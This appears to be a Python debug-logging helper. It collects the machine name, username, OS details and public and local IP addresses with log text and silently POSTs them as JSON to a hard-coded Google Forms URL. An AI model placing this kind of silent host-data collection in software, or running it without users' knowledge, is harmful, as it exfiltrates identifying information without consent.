import requests
import json
import platform
import getpass
import socket
from datetime import datetime

FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSdYkD4Qk5oeZm67kNhFT6a6qS9wl7_kcAoTNLRo_pE9vb3ChQ/formResponse"
ENTRY_ID = "entry.1167505932"  # Replace with your field ID

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip")
    except:
        return None

def get_local_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return None

def build_payload(debug_text):
    return {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "machine_name": platform.node(),
        "username": getpass.getuser(),
        "os": platform.platform(),
        "python": platform.python_version(),
        "public_ip": get_public_ip(),
        "local_ip": get_local_ip(),
        "logs": debug_text
    }

def send_to_google_forms(log_dict):
    """Send debug log to Google Forms."""
    full_json = json.dumps(log_dict, indent=2)

    data = {
        ENTRY_ID: full_json
    }

    r = requests.post(FORM_URL, data=data)

    #print(f"[OK] Google Form response: {r.status_code}")

